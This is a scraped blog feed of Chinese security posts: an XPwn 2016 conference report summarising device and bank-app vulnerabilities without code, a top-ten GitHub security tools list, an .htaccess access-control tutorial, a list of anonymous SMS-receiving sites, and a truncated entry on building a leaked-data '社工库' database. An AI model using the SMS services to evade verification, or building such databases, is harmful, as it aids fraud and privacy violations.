<h2 id="XPwn：老牌安全会议XCON开“新花”"><a href="#XPwn：老牌安全会议XCON开“新花”" class="headerlink" title="XPwn：老牌安全会议XCON开“新花”"></a>XPwn：老牌安全会议XCON开“新花”</h2><p>xPwn是由XCon组委会主办，北京华永兴安科学技术有限公司承办的智能生活产品安全问题研究探索大会。今年将与XCon安全焦点安全技术峰会以及其他的一些安全活动联合举办。 通过xPwn吸引国内外一流的极客、黑客发现并解决智能设备上存在的安全问题，推动厂商及时修正问题，更加重视安全问题，探索更好的安全解决办法，从而提高产品安全质量。</p>
<p>XPwn2016总的奖金池500万人民币，并且部分获奖优秀选手，除了能获得奖金和荣誉外，组委会另设立一项独家奖励机制：导师+天使基金为破解技术提供孵化能力，让技术产品化、商业化，让好的技术和人才能够创造更大的价值获得更多的回报。XPwn的关注方向为智能终端，智能穿戴，智能家居，智能交通，生活O2O和未来安全。</p>
<p>XPwn的电子身份凭证有着一股强烈的极客范儿！</p>
<h2 id=""><a href="#" class="headerlink" title=""></a><a href="http://image.3001.net/images/20160901/14726747137475.jpg" target="_blank" rel="external"><img src="http://image.3001.net/images/20160901/14726747137475.jpg!small" alt="179009695476987169.jpg"></a></h2><p>XPwn大会上面两枚漂亮的欧洲“妹纸”，有着一种说不出的雅典风味。</p>
<p><a href="http://image.3001.net/images/20160901/14726749894966.jpg" target="_blank" rel="external"><img src="http://image.3001.net/images/20160901/14726749894966.jpg!small" alt="512774544646863899.jpg"></a></p>
<p>磁悬浮XPwn标志，“黑科技”味十足。</p>
<p><a href="http://image.3001.net/images/20160901/14726750806325.jpg" target="_blank" rel="external"><img src="http://image.3001.net/images/20160901/14726750806325.jpg!small" alt="177040463805313001.jpg"></a></p>
<p>在现场就坐的参会人员。</p>
<p><a href="http://image.3001.net/images/20160901/14726753032420.jpg" target="_blank" rel="external"><img src="http://image.3001.net/images/20160901/14726753032420.jpg!small" alt="123824213255053639.jpg"></a></p>
<p>XPwn大会上负责现场直播的美女主播们。</p>
<p><a href="http://image.3001.net/images/20160901/14726753682230.jpg" target="_blank" rel="external"><img src="http://image.3001.net/images/20160901/14726753682230.jpg!small" alt="374277052004757553.jpg"></a></p>
<p>XPwn前台接待人员</p>
<p><a href="http://image.3001.net/images/20160901/1472678712420.jpg" target="_blank" rel="external"><img src="http://image.3001.net/images/20160901/1472678712420.jpg!small" alt="758027661324424240.jpg"></a></p>
<h2 id="参赛细节"><a href="#参赛细节" class="headerlink" title="参赛细节"></a>参赛细节</h2><h3 id="智能家居设备（相关品牌：小米）"><a href="#智能家居设备（相关品牌：小米）" class="headerlink" title="智能家居设备（相关品牌：小米）"></a>智能家居设备（相关品牌：小米）</h3><p>小米的智能硬件生态包含多个智能设备，如智能插座、多功能网关等。为便于管理，小米为这些产品设计了一整套基础协议框架，统一实现设备接入、数据传输与控制管理。但是由于某个环节设计不当，导致小米的智能设备可被攻击者远程控制。小米相关负责人表示该漏洞目前已经修复，并且表达了对该研究人员的感谢。</p>
<p><a href="http://image.3001.net/images/20160901/14726767278249.jpg" target="_blank" rel="external"><img src="http://image.3001.net/images/20160901/14726767278249.jpg!small" alt="814375586570518326.jpg"></a></p>
<h3 id="路由器（相关品牌：ikuai，极路由和思科）"><a href="#路由器（相关品牌：ikuai，极路由和思科）" class="headerlink" title="路由器（相关品牌：ikuai，极路由和思科）"></a>路由器（相关品牌：ikuai，极路由和思科）</h3><p>在这个参赛环节，参赛人员展示了ikuai，极路由和思考三款路由器的漏洞利用。针对极路由的漏洞，用户只需点击攻击者编写的恶意网页，攻击者就可以获得路由器的SSH Shell权限。该漏洞涉及到csrf攻击，dns劫持，远程种马，远程获取root权限等。</p>
<p><a href="http://image.3001.net/images/20160901/14726774697149.jpg" target="_blank" rel="external"><img src="http://image.3001.net/images/20160901/14726774697149.jpg!small" alt="792668516346234141.jpg"></a></p>
<p>自从“影子经纪人”爆出NSA的泄露文件后，小编认为近几个月不再会有思科的0day出现。但是在XPwn大会上，Slipper和Kelwin展示了针对思考防火墙的命令执行漏洞，引起了众多评委的注意。</p>
<p><a href="http://image.3001.net/images/20160901/14726780893203.jpg" target="_blank" rel="external"><img src="http://image.3001.net/images/20160901/14726780893203.jpg!small" alt="674821066747585439.jpg"></a></p>
<h3 id="笔记本电脑（相关品牌：索尼）"><a href="#笔记本电脑（相关品牌：索尼）" class="headerlink" title="笔记本电脑（相关品牌：索尼）"></a>笔记本电脑（相关品牌：索尼）</h3><p>BIOS是电脑底层的一个操作系统，在XPwn大会上，404 Team研究人员发现索尼的BIOS系统对BIOS密码采用了64位RSA加密，非常容易遭到破解。专家评委王英键（呆神）评价道：“一般人的电脑都不会设置BIOS密码，但是如果有人对电脑设置BIOS密码，那么他们的电脑内一般都有非常重要的资料。”</p>
<p><a href="http://image.3001.net/images/20160901/1472679401364.jpg" target="_blank" rel="external"><img src="http://image.3001.net/images/20160901/1472679401364.jpg!small" alt="324129579757834285.jpg"></a></p>
<h3 id="贩卖机"><a href="#贩卖机" class="headerlink" title="贩卖机"></a>贩卖机</h3><p>在XPwn大会上，来自百度的小灰灰为我们展示了某贩卖机厂商的安全漏洞。据了解，该贩卖机占据了国内百分之八十的份额，漏洞危害十分广泛。这个参赛漏洞也是全场奖金最高的，该研究人员获得了十余万元人民币的奖金。该贩卖机采用了安卓系统对其进行控制，研究人员首先对控制APP进行了一个逆向分析，查找到了相关的接口和服务器地址，随后进行相关的漏洞挖掘。该贩卖机存在以下几个漏洞。</p>
<blockquote>
<p>漏洞一：支付逻辑漏洞</p>
<p>漏洞二：后台权限绕过访问</p>
<p>漏洞三：升级漏洞导致官方APP可被任意替换</p>
<p>漏洞四：大量敏感信息泄露</p>
<p>漏洞五：wifi劫持</p>
<p>漏洞六：3G/4G流量劫持</p>
<p>漏洞七：物理绕过<br><a href="http://image.3001.net/images/20160901/14726799586264.jpg" target="_blank" rel="external"><img src="http://image.3001.net/images/20160901/14726799586264.jpg!small" alt="919344873364759480.jpg"></a></p>
</blockquote>
<h3 id="工控4-0和交换机（相关厂商：西门子）"><a href="#工控4-0和交换机（相关厂商：西门子）" class="headerlink" title="工控4.0和交换机（相关厂商：西门子）"></a>工控4.0和交换机（相关厂商：西门子）</h3><p>XPwn参赛研究人员发现，西门子的工控4.0设备存在设计缺陷。研究人员展示了西门子PLC控制器之间的恶意代码传播。其次还有西门子的交换机存在漏洞，发送恶意数据包即可让交换机部分功能瘫痪。这个两个设备在工业控制领域十分广泛，其影响也不可忽视。</p>
<p><a href="http://image.3001.net/images/20160901/14726802806766.jpg" target="_blank" rel="external"><img src="http://image.3001.net/images/20160901/14726802806766.jpg!small" alt="649472093807709865.jpg"></a></p>
<h3 id="固件中的安全思考（相关品牌：锤子手机）"><a href="#固件中的安全思考（相关品牌：锤子手机）" class="headerlink" title="固件中的安全思考（相关品牌：锤子手机）"></a>固件中的安全思考（相关品牌：锤子手机）</h3><p>来自百度安全实验室的胡明现场演示了如何绕过锤子手机的底层固件，安装第三方系统。</p>
<p><a href="http://image.3001.net/images/20160901/14726807717236.jpg" target="_blank" rel="external"><img src="http://image.3001.net/images/20160901/14726807717236.jpg!small" alt="669445700015843287.jpg"></a></p>
<h2 id="大会亮点"><a href="#大会亮点" class="headerlink" title="大会亮点"></a>大会亮点</h2><h3 id="iOS-10-beta越狱演示"><a href="#iOS-10-beta越狱演示" class="headerlink" title="iOS 10 beta越狱演示"></a><strong>iOS 10 beta越狱演示</strong></h3><p>在大会上，犇众信息联合创始人陈小波（DM）现场演示了iOS 10 beta的越狱视频。通过演示视频，小编了解到他们首先是在iOS 10 beta上安装一个低权限的第三方APP。打开该APP后，它会通过相关iOS漏洞获得root权限，并且成功安装Cydia。</p>
<p><a href="http://image.3001.net/images/20160901/1472681014789.jpg" target="_blank" rel="external"><img src="http://image.3001.net/images/20160901/1472681014789.jpg!small" alt="820460690122143711.jpg"></a></p>
<h3 id="银行APP安全检测"><a href="#银行APP安全检测" class="headerlink" title="银行APP安全检测"></a>银行APP安全检测</h3><p>在现场，某位安全研究人员还演示了国内众多银行的APP漏洞。该研究人员首先是填写指定转款人姓名，联系方式，银行账户，短信验证码等常规操作。看似非常安全和正常的操作，但是到最后钱却转到了另外一个人的账户上。由于该漏洞过于敏感，会议上并没有披露漏洞的细节。</p>
<p><a href="http://image.3001.net/images/20160901/14726818316577.jpg" target="_blank" rel="external"><img src="http://image.3001.net/images/20160901/14726818316577.jpg!small" alt="439998310454631692.jpg"></a></p>
<h2 id="「极客奥运会」圆满落幕"><a href="#「极客奥运会」圆满落幕" class="headerlink" title="「极客奥运会」圆满落幕"></a>「极客奥运会」圆满落幕</h2><p>至此，XPwn已经圆满结束。人们生活对于互联网已经产生依赖，针对互联网安全研究的路上，需要各行各业的不懈努力。主办方介绍，XPwn更关注的不是发现隐患，而是消除隐患。XPwn希望通过这样的活动，联合极客圈的力量，为网络安全护航。</p>
<p><a href="http://image.3001.net/images/20160901/14726821946939.jpg" target="_blank" rel="external"><img src="http://image.3001.net/images/20160901/14726821946939.jpg!small" alt="20958907836330855.jpg"></a></p>
<p><strong>* FreeBuf官方报道，作者/ArthurKiller，转载请注明来自FreeBuf（FreeBuf.COM）</strong></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[GitHub上10个最受欢迎的安全项目]]></title>
      <url>http://www.linux52.com/2016-09-09-github-e4-b8-8a10-e4-b8-aa-e6-9c-80-e5-8f-97-e6-ac-a2-e8-bf-8e-e7-9a-84-e5-ae-89-e5-85-a8-e9-a1-b9-e7-9b-ae.html</url>
      <content type="html"><![CDATA[<p><a href="http://image.3001.net/images/20160907/14732567998627.jpg" target="_blank" rel="external"><img src="http://image.3001.net/images/20160907/14732567998627.jpg!small" alt="1421819031148798.jpg"></a></p>
<blockquote>
<p>开源项目最终还是迎来了属于它的胜利，虽然这胜利姗姗来迟，但终究还是实现了。在信息安全领域，尽管许多公司封锁了它们的专有软件代码，但仍有许多开源项目可供安全专家使用。</p>
<p>其中，寻找开源安全相关项目的首选就是GitHub。你可以利用GitHub的搜索功能发现有用的工具，但是，GitHub有一个地方可以帮你获寻最热门的安全项目，就是所谓的GitHub Showcases板块，但是在 GitHub上，这个板块却鲜为人知。<br><strong>2014年开始，Showcases设立了最热门安全项目类别 。Showcases上罗列的项目主要按星级罗列，也就是说，通常列表显示的是当今 最流行的项目。</strong></p>
</blockquote>
<p>Showcases的“安全”类别包含24个项目。<strong>下面的项目为当下GitHub上最受欢迎的Top10 开源安全项目：</strong></p>
<h3 id="1-osquery-–-源自Facebook"><a href="#1-osquery-–-源自Facebook" class="headerlink" title="1. osquery – 源自Facebook "></a><strong>1. osquery – 源自Facebook </strong></h3><p><a href="https://github.com/facebook/osquery" target="_blank" rel="external"><strong>osquery</strong></a>是一个高性能关系数据库的操作系统，允许编写SQL查询，探索操作系统数据。借助osquery，SQL表格表现的是抽象概念，比如运行过程、加载的内核模式、开放的网络连接、浏览器插件、硬件事件或文件 hash。</p>
<h3 id="2-Metasploit-Framework-–-源自Rapid7"><a href="#2-Metasploit-Framework-–-源自Rapid7" class="headerlink" title="2. Metasploit Framework – 源自Rapid7 "></a><strong>2. Metasploit Framework – 源自Rapid7 </strong></h3><p><a href="https://github.com/rapid7/metasploit-framework" target="_blank" rel="external"><strong>Metasploit Framework</strong></a>是开发并执行针对远程目标设备漏洞利用代码的工具。</p>
<h3 id="3-Infer-–源自Facebook"><a href="#3-Infer-–源自Facebook" class="headerlink" title="3. Infer –源自Facebook "></a><strong>3. Infer –源自Facebook </strong></h3><p><a href="https://github.com/facebook/infer" target="_blank" rel="external"><strong>Facebook Infer</strong></a>是一款静态分析工具，如果你给Infer一些Objective-C、Java或C代码，它会生成一个潜在漏洞列表。在关键漏洞转移至用户手机之前，任何人都可以使用Infer拦截关键漏洞，并帮助防止死机或性能差。</p>
<h3 id="4-Brakeman-–-源自PresidentBeef"><a href="#4-Brakeman-–-源自PresidentBeef" class="headerlink" title="4. Brakeman – 源自PresidentBeef "></a><strong>4. Brakeman – 源自PresidentBeef </strong></h3><p><a href="https://github.com/presidentbeef/brakeman" target="_blank" rel="external"><strong>Brakeman</strong></a>是一个开源静态分析工具，负责检查Ruby on Rails应用程序的安全漏洞。</p>
<h3 id="5-Radare2-–-源自the-Radare项目"><a href="#5-Radare2-–-源自the-Radare项目" class="headerlink" title="5. Radare2 – 源自the Radare项目"></a><strong>5. Radare2 – 源自the Radare项目</strong></h3><p><a href="https://github.com/radare/radare2" target="_blank" rel="external"><strong>Radare</strong></a>是一个取证工具以及可编写脚本的命令行十六进制编辑器，可以打开磁盘文件、支持分析二进制、反汇编代码、调试程序以及连接到远程gdb服务器…</p>
<h3 id="6-OS-X-Auditor-–-源自Jean-Philippe-Teissier"><a href="#6-OS-X-Auditor-–-源自Jean-Philippe-Teissier" class="headerlink" title="6. OS X Auditor – 源自Jean-Philippe Teissier "></a><strong>6. OS X Auditor – 源自Jean-Philippe Teissier </strong></h3><p><a href="https://github.com/jipegit/OSXAuditor" target="_blank" rel="external"><strong>OS X Auditor</strong></a>是一个免费的Mac OS X计算机取证工具，负责分析多类型文件的可疑内容。</p>
<h3 id="7-BeEF-–-源自BeEF项目"><a href="#7-BeEF-–-源自BeEF项目" class="headerlink" title="7. BeEF – 源自BeEF项目 "></a><strong>7. BeEF – 源自BeEF项目 </strong></h3><p><a href="https://github.com/beefproject/beef" target="_blank" rel="external"><strong>BeEF</strong></a>是The Browser Exploitation Framework的缩写，它是一个 专注网页浏览器的渗透测试工具。</p>
<h3 id="8-Cuckoo-–-源自Cuckoo沙盒项目"><a href="#8-Cuckoo-–-源自Cuckoo沙盒项目" class="headerlink" title="8. Cuckoo – 源自Cuckoo沙盒项目 "></a><strong>8. Cuckoo – 源自Cuckoo沙盒项目 </strong></h3><p><a href="https://github.com/cuckoosandbox/cuckoo" target="_blank" rel="external"><strong>Cuckoo Sandbox</strong></a>是一个自动动态恶意软件分析系统。这意味着什么呢？简单来说就是，你可以将任何可疑文件丢给它，Cuckoo会在几秒内为你反馈一个详细结果，概括此类文件在在孤立环境中执行时的活动。</p>
<h3 id="9-Scumblr-–-源自Netflix"><a href="#9-Scumblr-–-源自Netflix" class="headerlink" title="9. Scumblr – 源自Netflix "></a><strong>9. Scumblr – 源自Netflix </strong></h3><p><a href="https://github.com/Netflix/Scumblr" target="_blank" rel="external"><strong>Scumblr</strong></a>是一个Web应用程序，允许执行定期搜索和存/取识别结果的行为。</p>
<h3 id="10-Moloch-–-源自AOL"><a href="#10-Moloch-–-源自AOL" class="headerlink" title="10. Moloch – 源自AOL "></a><strong>10. Moloch – 源自AOL </strong></h3><p><a href="https://github.com/aol/moloch" target="_blank" rel="external"><strong>Moloch</strong></a>是一个开源的，大规模的数据包捕获、索引和数据库系统。为PCAP浏览、搜索和导出提供了一个简单的Web接口。API接口都是公开的，允许直接下载PCAP数据和JSON格式的会话数据。通过使用HTTPS和HTTP摘要密码支持或通过使用前面的Apache实现安全。Moloch并不是为了取代IDS，而是与之合作，储存并索引标准PACP格式中的所有网络流量，提供快速访问。Moloch可以在多个系统部署，处理数万gigabits（G比特）/sec（秒）的流量。</p>
<p><strong>以上就是当前GitHub上最受欢迎的开源安全项目。您可以定期查看<a href="https://github.com/showcases/security?s=stars" target="_blank" rel="external">Showcases板块</a>， 了解最流行的项目及分析各类项目的变化趋势。</strong></p>
<p><strong>* 参考来源：<a href="http://news.softpedia.com/news/the-top-10-most-popular-security-projects-on-github-507934.shtml" target="_blank" rel="external">softpedia</a>，米雪儿编译，转载请注明来自FreeBuf.COM</strong></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[.htaccess教程：简介、访问控制、验证、目录浏览控制]]></title>
      <url>http://www.linux52.com/2016-08-20-htaccess-e6-95-99-e7-a8-8b-ef-bc-9a-e7-ae-80-e4-bb-8b-e3-80-81-e8-ae-bf-e9-97-ae-e6-8e-a7-e5-88-b6-e3-80-81-e9-aa-8c-e8-af-81-e3-80-81-e7-9b-ae-e5-bd-95-e6-b5-8f-e8-a7-88-e6-8e-a7-e5-88-b6.html</url>
      <content type="html"><![CDATA[<div class="text"><br><br>## 一、.htaccess简介<br><br>### 1.什么是.htaccess<br><br>.htaccess是一个纯文本文件，里面存放着Apache服务器配置相关的一些指令，它类似于Apache的站点配置文件，如httpd.conf（Apache2已经支持多站点，因此你的站点配置文件可能在/etc/apache2/conf.d/目录下）。<br>.htaccess与httpd.conf配置文件不同的是，它<strong>只作用于当前目录</strong>。另外httpd.conf是在Apache服务启动的时候就加载的，而.htaccess<strong>只有在用户访问目录时加载</strong>，开销大、速度慢。<br>既然如此，为什么我们还要用.htaccess呢？因为它配置起来简单，它还支持重定向、URL重写以及访问验证，另外它管理起来很方便，可以很好适应网站迁移。总之，各有优缺点，主要就看你是要从全局考虑还是只配置单个目录。<br><br>### 2.AllowOverride All<br><br>通常情况下，Apache是默认启用.htaccess的，但是为了以防万一，请检查一下自己站点的配置文件，如httpd.conf，是否有这行：<br><pre>AllowOverride All<br></pre><br>这行允许重写配置文件。也就是如果能够从.htaccess加载配置文件，那么就以.htaccess为配置文件对其所在目录进行配置。<br><br>### 3.500错误<br><br>如果你租用了云服务提供商的主机或者空间，那么他们可能不会给你读写httpd.conf文件的权限，你也不可能检查<strong>AllowOverride</strong>命令参数是否为<strong>All</strong>，这时，你可以新建一个目录，在里面写一个.htaccess文件，文件中随意写入一些服务器看不懂的东西，然后访问该目录里的一个页面，耐心等待<strong>500错误</strong>的出现。<br>如果没有出现，那么.htaccess没有被启用，你需要向你的服务供应商寻求帮助；如果出现了，那么恭喜你，你可以对当前目录重写Apache配置。<br><strong>/!\注意：</strong>.htaccess语法错误可能会影响整个站点，如果你不确定这样做是否安全，请联系你的云服务供应商。<br><br>### 4.有用的文档<br><br><em>   <a href="http://lesca.me/archives/htaccess-appendix.html#htaccess_regex" target="_blank" rel="external">.htaccess正则表达式</a>
</em>   <a href="http://lesca.me/archives/htaccess-appendix.html#redirect_codes" target="_blank" rel="external">HTTP协议重定向编码</a><br><br>## 二、.htaccess访问控制(Allow/Deny)<br><br>### 1.访问控制基础：Order命令<br><br>为了限制用户访问一些关键目录，.htaccess可以提供目录访问限制。你只需要在要限制的目录中，加入如下.htaccess文件：<br><pre># no one gets in here!<br>deny from all<br></pre><br>这会限制所有用户通过浏览器访问该目录，这太一刀切了，因此我们还可以增加一些特定的条件，如允许指定IP地址的访问：<br><pre>Order Allow,Deny<br>Deny from All<br>Allow from 192.168.0.0/24<br></pre><br><br>### Order命令<br><br>Order命令是一个难点，也是配置apache的基础，它决定了Apache处理访问规则的顺序。<br><br><em>   通过<strong>Allow,Deny</strong>参数，Apache首先找到并应用<strong>Allow</strong>命令，然后应用<strong>Deny</strong>命令，以阻止所有访问。
</em>   通过<strong>Deny,Allow</strong>参数，Apache首先找到并应用<strong>Deny</strong>命令，然后应用<strong>Allow</strong>命令，以允许所有访问。<br>了解Order的用法后，再仔细考虑下上面的例子，你或许能够发现<strong>Deny</strong>命令是多余的，以下用法和之前的描述语义相同：<br><pre>Order Allow,Deny<br>Allow from 192.168.0/24<br></pre><br><br>### 2.利用.htaccess过滤域名或网络主机(Allow/Deny)<br><br>下例可以限制所有含有“domain.com”的网络主机访问网站：<br><pre>Order Allow,Deny<br>Allow from all<br>Deny from .<em>domain.com.</em><br></pre><br><strong>{!}Info</strong>：有关htaccess的正则表达式用法，请查阅本站《<a href="http://lesca.me/archives/htaccess-appendix.html#htaccess_regex" target="_blank" rel="external">.htaccess正则表达式</a>》一文。<br><br>### 3.利用.htaccess禁止访问指定文件(Files)<br><br>Files命令可以用于过滤指定文件：<br><pre># secure htaccess file<br>&lt;Files .htaccess&gt;<br> order allow,deny<br> deny from all<br>&lt;/Files&gt;<br></pre><br><br>### 4.利用.htaccess禁止访问指定文件类型(FilesMatch)<br><br>下面的代码将限制访问所有.log和.exe文件：<br><pre>&lt;FilesMatch “.(log|exe)$”&gt;<br> Order allow,deny<br> Deny from all<br>&lt;/FilesMatch&gt;<br></pre><br>我们还可以通过<strong>Files</strong>命令描述文件类型，但是需要在命令后面加一个波浪线(~)，该符号启用Files命令的正则表达解析功能：<br><pre>&lt;Files ~ “^.<em>.([Ll][Oo][Gg])|([eE][xX][eE])”&gt;<br> Order allow,deny<br> Deny from all<br> Satisfy All<br>&lt;/Files&gt;<br></em></pre><br>有以下几点需要读者注意：

   Files之后的<strong>波浪线</strong>用于开启“正则表达式”分析。请注意，这是个过时的用法，Apache<a href="http://httpd.apache.org/docs/2.2/mod/core.html#files" target="_blank" rel="external">更推荐使用&lt;FilesMatch&gt;指令</a><sup>[3]</sup><br><em>   正则表达式必须在<strong>双引号</strong>之间，有关htaccess的正则表达式用法，请查阅本站《<a href="http://lesca.me/archives/htaccess-appendix.html#htaccess_regex" target="_blank" rel="external">.htaccess正则表达式</a>》一文。
</em>   双引号中的“管道符”(|)用于将两种文件类型（.log和.exe）分开，相当于逻辑“或”<br><em>   Order命令必须嵌在Files节(Section)中，否则将会应用到所有文件
</em>   <strong>Satisfy All</strong>表示必须同时满足主机级别(Allow/Denay)和用户级别(Require)的限制，All是默认值，该行可以省略。<br><br>### 5.高级访问控制(Rewrite)<br><br>我们还可以通过运用Rewrite实现更强大的访问控制，但是Rewrite不是本文讨论的内容。读者可以参看：<a href="http://lesca.me/archives/htaccess-rewrite.html#access_control" target="_blank" rel="external">利用RewriteCond和RewriteRule进行访问控制</a>一文。<br><br>## 三、利用.htaccess进行密码保护与验证<br><br>### 1.配置.htaccess<br><br><pre>AuthType Basic<br>AuthName “restricted area”<br>AuthUserFile /usr/local/var/www/html/.htpasses<br>require valid-user<br></pre><br>这个配置文件可以保护.htaccess所在的整个目录，简单说明下参数：<br><br><em>   <strong>AuthType：</strong>验证类型为基本类型，密码以<strong>明文</strong>方式传输到服务器上
</em>   <strong>AuthName：</strong>验证提示，会出现在验证对话框中<br><em>   <strong>AuthUserFile：</strong>验证配置文件，用于匹配用户名与密码，该密码是加密保存的
</em>   <strong>require valid-user：</strong>只有在AuthUserFile中出现的用户才可以通过验证<br>如果验证失败，则会出现<strong>401</strong>错误。<br><br>### 2.生成.htpasses文件<br><br>如何生成.htpasses文件呢？我们通过<code>htpasswd</code>命令生成密码文件：<br><pre>htpasswd -c /usr/local/var/www/html/.htpasses lesca<br></pre><br>它会提示你输入密码，并确认。之后将密码文件.htpasses保存在/usr/local/var/www/html/目录下。<br><br>### 3.对文件进行密码保护<br><br>保护与.htaccess在同一目录下的文件<strong>secure.php</strong>：<br><pre># password-protect single file<br>&lt;Files secure.php&gt;<br>AuthType Basic<br>AuthName “Prompt”<br>AuthUserFile /home/path/.htpasswd<br>Require valid-user<br>&lt;/Files&gt;<br></pre><br>保护.htaccess所在目录下的多个文件：<br><pre># password-protect multiple files<br>&lt;FilesMatch “^(execute|index|secure|insanity|biscuit)<em>$”&gt;<br>AuthType basic<br>AuthName “Development”<br>AuthUserFile /home/path/.htpasswd<br>Require valid-user<br>&lt;/FilesMatch&gt;<br></em></pre><br><br>### 4.对指定IP进行密码保护<br><br>仅允许IP地址为99.88.77.66的主机直接访问该目录，其他IP需要验证。<br><pre>AuthType Basic<br>AuthName “Personal”<br>AuthUserFile /home/path/.htpasswd<br>Require valid-user<br>Allow from 99.88.77.66<br>Satisfy Any<br></pre><br><br>### 5.安全性<br><br>出于安全考虑，将.htpasses文件存放在WEB目录树之外也许是个好方法，但是由于.htpasses是隐藏文件，而且Apache不会输出隐藏文件，因此可以满足基本的安全要求。这是通过在主配置文件中加入如下限制实现的：<br><pre>&lt;Files ~ “^.ht”&gt;<br> Order allow,deny<br> Deny from all<br> Satisfy All<br>&lt;/Files&gt;<br></pre><br>一般而言，这是默认设置，用户无需手动添加。我们唯一需要担心的是密码在网络传输过程中是<strong>明文</strong>形式，这很容易被黑客破译。Coz<sup>[1]</sup>提供了一个开源项目<a href="http://corz.org/serv/security/pajamas.php" title="php and javascript advanced md5 authentication system" target="_blank" rel="external">Pajamas</a>可以在本地利用JS对密码进行MD5加密，有兴趣的读者可以前去研究一下。<br><br>## 四、目录浏览与主页<br><br>如果你打开本站的下载页面<a href="http://download.lesca.me/" target="_blank" rel="external">http://download.lesca.me/</a>，就会发现你可以看见这个站点下的所有文件。像这样的特性也可以通.htaccess来设置用户是否有权限浏览服务器目录。<br><br>### 1.启用目录浏览<br><br><pre># enable directory browsing<br>Options All +Indexes<br></pre><br><br>### 2.禁用目录浏览<br><br><pre># disable directory browsing<br>Options All -Indexes<br></pre><br>我们还可以通过<strong>IndexIgnore</strong>指令来禁用目录浏览。<br><pre># prevent folder listing<br>IndexIgnore <br></pre><br>通过<strong>IndexIgnore</strong>指令，我们可以禁止对指定类型的文件浏览：<br><pre># prevent display of select file types<br>IndexIgnore <em>.wmv </em>.mp4 <em>.avi </em>.etc<br></pre><br><br>### 3.自定义目录浏览<br><br>如果你希望Apache在展示你的WEB目录时看起来与众不同，那么你需要启用<strong>FancyIndexing</strong>选项：<br><pre>&lt;IfModule mod_autoindex.c&gt;<br> IndexOptions FancyIndexing<br>&lt;/ifModule&gt;<br></pre><br>通过这个选项，你可以实现自定义图标、添加文件类型描述、按日期排序等。但是这些已经超过了本文的讨论范围，Lesca可以给你一个做好的<a href="http://corz.org/serv/resources/file_view.htaccess.txt?raw=true" title="file_view.htaccess" target="_blank" rel="external">例子</a>，你可以在<a href="http://corz.org/public/images/" target="_blank" rel="external">这页查看效果</a>。<br><br>### 4.配置目录主页文件<br><br>即使启用了目录浏览，Apache未必会展示该目录的内容，因为该目录可能存在像index.htm这样的默认主页文件。Apache会有限展示主页文件，我们可以通过.htaccess设置：<br><pre>DirectoryIndex index.html index.php index.htm<br></pre><br><br>### 5.配置错误页面<br><br>如果Apache遇到错误，就会输出错误页面。配置自定义的错误页面，也许可以挽留即将离开的用户。<br><pre># custom error documents<br>ErrorDocument 401 /err/401.php<br>ErrorDocument 403 /err/403.php<br>ErrorDocument 404 /err/404.php<br>ErrorDocument 500 /err/500.php<br></pre><br><br>## 五、URL重写与URL重定向<br><br>下一篇文章，我们将介绍htaccess的重头戏：<a href="http://lesca.me/archives/htaccess-rewrite.html" target="_blank" rel="external">URL重写与URL重定向</a><br><br>## References:<br><br>[1] <a href="http://corz.org/serv/tricks/htaccess.php" target="_blank" rel="external">.htaccess tips and tricks</a><br>[2] <a href="http://perishablepress.com/stupid-htaccess-tricks/" target="_blank" rel="external">Stupid htaccess Tricks</a><br>[3] <a href="http://httpd.apache.org/docs/2.2/mod/core.html#files" target="_blank" rel="external">Files Directive</a><br><br></div><br><div class="text_add"><br><br>本文出自 Lesca技术宅，转载时请注明出处及相应链接。<br><br>本文永久链接: <a href="http://lesca.me/archives/htaccess-basic.html" target="_blank" rel="external">http://lesca.me/archives/htaccess-basic.html</a><br><br></div>]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[几个可以免费在线]]></title>
      <url>http://www.linux52.com/2016-07-05-e5-87-a0-e4-b8-aa-e5-8f-af-e4-bb-a5-e5-85-8d-e8-b4-b9-e5-9c-a8-e7-ba-bf.html</url>
      <content type="html"><![CDATA[<h1 id="几个可以免费在线收短信的网站"><a href="#几个可以免费在线收短信的网站" class="headerlink" title="几个可以免费在线收短信的网站"></a>几个可以免费在线收短信的网站</h1><pre class="prettyprint linenums">Receive-SMS.com
Address: www.receive-sms.com  www.receive-sms.com
Country of the phone number: UK, Sweden8
Requirements:No registration.! 

ReceiveFreeSMS.com
Address: www.receivefreesms.com
Country of the phone number: US, UK, Norway, Sweden, Netherlands, Australia, Hungary, Lithuania, Spai
Requirements:No registration
ReceiveSMSOnline.net
Address: www.receivesmsonline.net
Country of the phone number: US, UK
Requirements:No registration.
 FreeOnlinePhone.org
Address: www.freeonlinephone.org
Country of the phone number: US
Requirements:No registratio
 Receive-sms-online.com
Address: http://receive-sms-online.com
Country of the phone number: Norway, UK;
Requirements:No registration.

Sellaite

Address: http://sellaite.com/smsreceiver
Country of the phone number: Estonia
Requirements:No registration.8 O"

receivesmsonline.com/
receivefreesms.com/

sellaite.com/smsreceiver/
</pre>

<h1 id="免费匿名在线发短信跟传真"><a href="#免费匿名在线发短信跟传真" class="headerlink" title="免费匿名在线发短信跟传真"></a>免费匿名在线发短信跟传真</h1><pre class="prettyprint linenums">
www.afreesms.com/intl/china

传真 www.myfax.com/free/
</pre>

<p>转载至：<a href="http://www.138vps.com/freeot/532.html" target="_blank" rel="external">http://www.138vps.com/freeot/532.html</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[使用ELK搭建社工库]]></title>
      <url>http://www.linux52.com/2016-07-03-e4-bd-bf-e7-94-a8elk-e6-90-ad-e5-bb-ba-e7-a4-be-e5-b7-a5-e5-ba-93.html</url>
      <content type="html"><![CDATA[<p>来自： <a href="https://www.t00ls.net/articles-32593.html" target="_blank" rel="external">https://www.t00ls.net/articles-32593.html</a></p>
